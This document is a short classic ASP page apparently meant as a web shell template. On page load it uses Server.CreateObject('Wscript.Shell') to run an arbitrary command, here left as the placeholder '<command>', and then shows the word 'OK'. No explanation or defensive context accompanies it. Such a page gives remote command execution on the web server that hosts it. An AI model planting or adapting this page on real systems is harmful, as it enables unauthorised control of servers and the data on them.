<%
Sub Page_Load
    Dim objShell : Set objShell = Server.CreateObject("Wscript.Shell")
    objshell.Run("<command>")
End Sub
%>

<!DOCTYPE html>
<html>
<body>
<% Page_Load %>
<h3>OK</h3>
</body>
</html>

